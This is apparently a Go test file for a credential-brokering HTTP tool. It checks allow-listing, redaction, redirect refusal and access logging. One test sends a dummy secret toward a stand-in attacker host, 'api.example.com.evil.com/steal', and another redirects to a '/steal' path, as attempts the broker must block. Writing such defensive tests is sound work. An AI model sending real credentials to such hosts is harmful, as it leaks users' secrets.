package mcp_test

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"

	"loadout.dev/loadout/internal/mcp"
	"loadout.dev/loadout/internal/vault"
)

// brokerDummyValue is the only secret value any test in this file
// ever uses. It is not a real credential.
const brokerDummyValue = "dummy-broker-secret-abc123"

// newBrokerVault returns a fresh vault holding one secret named
// "api-key", value brokerDummyValue, with allowedHosts as given.
func newBrokerVault(t *testing.T, allowedHosts []string) *vault.Vault {
	t.Helper()
	v, err := vault.Init(filepath.Join(t.TempDir(), "vault"))
	if err != nil {
		t.Fatalf("vault.Init: %v", err)
	}
	if err := vault.AddSecret(v, "api-key", "svc", "", "", "human", allowedHosts, []byte(brokerDummyValue)); err != nil {
		t.Fatalf("vault.AddSecret: %v", err)
	}
	return v
}

// hostOf returns rawURL's host (with port), the same shape the
// broker itself extracts and an allowed_hosts entry must match.
func hostOf(t *testing.T, rawURL string) string {
	t.Helper()
	u, err := url.Parse(rawURL)
	if err != nil {
		t.Fatal(err)
	}
	return u.Host
}

// brokerArgs is the "http_request" tool's argument shape, built here
// with encoding/json rather than hand-written strings so escaping a
// placeholder's braces is never a concern.
type brokerArgs struct {
	Method  string            `json:"method"`
	URL     string            `json:"url"`
	Headers map[string]string `json:"headers,omitempty"`
	Body    string            `json:"body,omitempty"`
}

func toJSON(t *testing.T, v any) string {
	t.Helper()
	data, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

// accessLogText reads v's access.log whole, or "" when it does not
// exist yet (a refused-before-decrypt call writes no entry, so the
// file may never have been created).
func accessLogText(t *testing.T, v *vault.Vault) string {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(v.Root, "access.log"))
	if os.IsNotExist(err) {
		return ""
	}
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

// TestHTTPRequestSubstitutesSecretIntoAllowedHost proves the headline
// mechanism: an allowed host plus a {{secret:api-key}} placeholder in
// a header value reaches the outbound server as the real dummy value
// (captured server-side, proving substitution), while the MCP tool
// result carries only the server's own response — never the dummy.
func TestHTTPRequestSubstitutesSecretIntoAllowedHost(t *testing.T) {
	var gotAuth string
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotAuth = r.Header.Get("Authorization")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"ok":true}`))
	}))
	defer server.Close()

	v := newBrokerVault(t, []string{hostOf(t, server.URL)})
	args := toJSON(t, brokerArgs{
		Method:  "GET",
		URL:     server.URL + "/path",
		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
	})
	text, isError := callTool(t, v, "http_request", args)
	if isError {
		t.Fatalf("http_request returned isError true: %s", text)
	}
	if gotAuth != "Bearer "+brokerDummyValue {
		t.Fatalf("server received Authorization = %q, want the substituted dummy value", gotAuth)
	}
	if strings.Contains(text, brokerDummyValue) {
		t.Fatalf("the tool result leaked the dummy value: %s", text)
	}
	var result struct {
		Status int    `json:"status"`
		Body   string `json:"body"`
	}
	if err := json.Unmarshal([]byte(text), &result); err != nil {
		t.Fatalf("the tool result did not parse as JSON: %v\ntext: %s", err, text)
	}
	if result.Status != http.StatusOK || result.Body != `{"ok":true}` {
		t.Fatalf("the tool result must carry the server's own response, got: %+v", result)
	}
}

// TestHTTPRequestScrubsSecretReflectedInResponse proves the second
// half of INVARIANT 10's extension: an allow-listed host is trusted
// with the secret, but if it reflects the value back — an echoed
// header, an error body quoting it — the tool result must never hand
// that value to the agent. Every exact occurrence is replaced with
// "[redacted-by-loadout]" instead.
func TestHTTPRequestScrubsSecretReflectedInResponse(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Echoed-Auth", r.Header.Get("Authorization"))
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"error":"bad credential: ` + r.Header.Get("Authorization") + `"}`))
	}))
	defer server.Close()

	v := newBrokerVault(t, []string{hostOf(t, server.URL)})
	args := toJSON(t, brokerArgs{
		Method:  "GET",
		URL:     server.URL,
		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
	})
	text, isError := callTool(t, v, "http_request", args)
	if isError {
		t.Fatalf("http_request returned isError true: %s", text)
	}
	if strings.Contains(text, brokerDummyValue) {
		t.Fatalf("the tool result must never hand the reflected dummy value back to the agent: %s", text)
	}
	if !strings.Contains(text, "[redacted-by-loadout]") {
		t.Fatalf("the tool result must show the redaction placeholder in place of the reflected value, got: %s", text)
	}
	// Both the reflected header AND the reflected body occurrence must
	// be scrubbed — not just one of the two.
	if strings.Count(text, "[redacted-by-loadout]") < 2 {
		t.Fatalf("want the placeholder in both the echoed header and the echoed body, got: %s", text)
	}
}

// TestHTTPRequestEmptyAllowedHostsRefused proves the fail-closed
// default: a secret with no allowed_hosts is refused before anything
// is decrypted or sent — the outbound server never even sees a
// connection.
func TestHTTPRequestEmptyAllowedHostsRefused(t *testing.T) {
	var hits int32
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&hits, 1)
	}))
	defer server.Close()

	v := newBrokerVault(t, nil)
	args := toJSON(t, brokerArgs{
		Method:  "GET",
		URL:     server.URL,
		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
	})
	text, isError := callTool(t, v, "http_request", args)
	if !isError {
		t.Fatalf("want isError true for an empty allowed_hosts, got text %q", text)
	}
	if atomic.LoadInt32(&hits) != 0 {
		t.Fatal("the outbound server must never receive a request when allowed_hosts is empty")
	}
	if strings.Contains(text, brokerDummyValue) {
		t.Fatalf("the refusal leaked the dummy value: %q", text)
	}
}

// TestHTTPRequestWrongHostRefused proves a request to a host NOT in
// allowed_hosts is refused, and the value is never sent.
func TestHTTPRequestWrongHostRefused(t *testing.T) {
	var hits int32
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&hits, 1)
	}))
	defer server.Close()

	v := newBrokerVault(t, []string{"some-other-host.example:9"})
	args := toJSON(t, brokerArgs{
		Method:  "GET",
		URL:     server.URL,
		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
	})
	text, isError := callTool(t, v, "http_request", args)
	if !isError {
		t.Fatalf("want isError true for a disallowed host, got text %q", text)
	}
	if atomic.LoadInt32(&hits) != 0 {
		t.Fatal("the outbound server must never receive a request to a disallowed host")
	}
	if strings.Contains(text, brokerDummyValue) {
		t.Fatalf("the refusal leaked the dummy value: %q", text)
	}
}

// TestHTTPRequestExactHostMatchNotSubstring proves allowed_hosts
// matching is exact: "api.example.com" must never match
// "api.example.com.evil.com". No real server is needed: the check
// runs on the parsed host string alone, before any connection is
// attempted.
func TestHTTPRequestExactHostMatchNotSubstring(t *testing.T) {
	v := newBrokerVault(t, []string{"api.example.com"})
	args := toJSON(t, brokerArgs{
		Method:  "GET",
		URL:     "http://api.example.com.evil.com/steal",
		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
	})
	text, isError := callTool(t, v, "http_request", args)
	if !isError {
		t.Fatalf("want isError true: a suffix match must never be treated as allowed, got text %q", text)
	}
	if strings.Contains(text, brokerDummyValue) {
		t.Fatalf("the refusal leaked the dummy value: %q", text)
	}
}

// TestHTTPRequestSecretInURLRefused proves a {{secret:...}} reference
// anywhere in the url is refused before any decrypt, even one shaped
// to look like part of the hostname, and writes no access-log entry.
func TestHTTPRequestSecretInURLRefused(t *testing.T) {
	v := newBrokerVault(t, []string{"example.com"})
	args := toJSON(t, brokerArgs{
		Method: "GET",
		URL:    "http://{{secret:api-key}}.example.com/",
	})
	text, isError := callTool(t, v, "http_request", args)
	if !isError {
		t.Fatalf("want isError true for a secret placeholder in the url, got text %q", text)
	}
	if !strings.Contains(text, "must not contain") {
		t.Fatalf("bad refusal message: %q", text)
	}
	if strings.Contains(text, brokerDummyValue) {
		t.Fatalf("the refusal leaked the dummy value: %q", text)
	}
	if strings.Contains(accessLogText(t, v), "broker") {
		t.Fatal("a refused-before-decrypt call must never write an access-log entry")
	}
}

// TestHTTPRequestRedirectDoesNotResendSecretToDifferentHost proves the
// cross-host redirect refusal: the allowed host receives the secret,
// but a 302 redirecting to a DIFFERENT host is never followed with
// the secret attached — the second server sees no request at all.
func TestHTTPRequestRedirectDoesNotResendSecretToDifferentHost(t *testing.T) {
	var targetHits int32
	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&targetHits, 1)
	}))
	defer target.Close()

	var redirectorAuth string
	redirector := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		redirectorAuth = r.Header.Get("Authorization")
		http.Redirect(w, r, target.URL+"/steal", http.StatusFound)
	}))
	defer redirector.Close()

	v := newBrokerVault(t, []string{hostOf(t, redirector.URL)})
	args := toJSON(t, brokerArgs{
		Method:  "GET",
		URL:     redirector.URL,
		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
	})
	text, isError := callTool(t, v, "http_request", args)
	if isError {
		t.Fatalf("http_request returned isError true: %s", text)
	}
	if redirectorAuth != "Bearer "+brokerDummyValue {
		t.Fatalf("the allowed host must receive the substituted value, got Authorization = %q", redirectorAuth)
	}
	if atomic.LoadInt32(&targetHits) != 0 {
		t.Fatal("the redirect target (a different host) must never receive a request")
	}
	if !strings.Contains(text, `"status":302`) {
		t.Fatalf("the tool result must report the 3xx status rather than follow it, got: %s", text)
	}
	if strings.Contains(text, brokerDummyValue) {
		t.Fatalf("the tool result leaked the dummy value: %s", text)
	}
}

// TestHTTPRequestAccessLogRecordsHostNotValue proves one "broker"
// access-log entry is written per secret used, naming the secret and
// the HOST — never the value, never the full url.
func TestHTTPRequestAccessLogRecordsHostNotValue(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer server.Close()
	host := hostOf(t, server.URL)

	v := newBrokerVault(t, []string{host})
	args := toJSON(t, brokerArgs{
		Method:  "GET",
		URL:     server.URL + "/some/path?token=x",
		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
	})
	if _, isError := callTool(t, v, "http_request", args); isError {
		t.Fatal("http_request must succeed against the allowed host")
	}

	logText := accessLogText(t, v)
	if !strings.Contains(logText, `"verb":"broker"`) {
		t.Fatalf("access log missing a broker entry: %s", logText)
	}
	if !strings.Contains(logText, `"secret":"api-key"`) {
		t.Fatalf("access log missing the secret name: %s", logText)
	}
	if strings.Contains(logText, brokerDummyValue) {
		t.Fatalf("access log leaked the dummy value: %s", logText)
	}
	if strings.Contains(logText, "/some/path") {
		t.Fatalf("access log must never carry the full url, only the host: %s", logText)
	}

	lines := strings.Split(strings.TrimSpace(logText), "\n")
	if len(lines) != 1 {
		t.Fatalf("want exactly 1 access-log line, got %d: %q", len(lines), logText)
	}
	var entry struct {
		Verb   string `json:"verb"`
		Secret string `json:"secret"`
		Host   string `json:"host"`
		Tool   string `json:"tool"`
	}
	if err := json.Unmarshal([]byte(lines[0]), &entry); err != nil {
		t.Fatalf("access-log line did not parse: %v", err)
	}
	if entry.Host != host {
		t.Fatalf("entry.Host = %q, want %q — the host must land in the dedicated Host field", entry.Host, host)
	}
	if entry.Tool != "" {
		t.Fatalf("entry.Tool = %q, want empty: a broker entry must not overload Tool with the host", entry.Tool)
	}
}

// TestHTTPRequestDummyValueNeverAppearsAcrossEveryCase drives several
// scenarios above (a success, and a secret placeholder in the url)
// through mcp.Serve directly and proves the dummy value appears in
// NONE of the raw JSON-RPC output.
func TestHTTPRequestDummyValueNeverAppearsAcrossEveryCase(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("ok"))
	}))
	defer server.Close()

	v := newBrokerVault(t, []string{hostOf(t, server.URL)})
	okArgs := toJSON(t, brokerArgs{
		Method:  "GET",
		URL:     server.URL,
		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
	})
	urlRefArgs := toJSON(t, brokerArgs{Method: "GET", URL: "http://{{secret:api-key}}.example.com/"})
	wrongHostArgs := toJSON(t, brokerArgs{
		Method:  "GET",
		URL:     "http://no-such-allowed-host.example:9",
		Headers: map[string]string{"Authorization": "Bearer {{secret:api-key}}"},
	})

	lines := []string{
		fmt.Sprintf(`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"http_request","arguments":%s}}`, okArgs),
		fmt.Sprintf(`{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"http_request","arguments":%s}}`, urlRefArgs),
		fmt.Sprintf(`{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"http_request","arguments":%s}}`, wrongHostArgs),
	}
	var out bytes.Buffer
	in := strings.NewReader(strings.Join(lines, "\n") + "\n")
	if err := mcp.Serve(v, in, &out); err != nil {
		t.Fatalf("Serve: %v", err)
	}
	if bytes.Contains(out.Bytes(), []byte(brokerDummyValue)) {
		t.Fatalf("the dummy value leaked into raw Serve output:\n%s", out.String())
	}
}
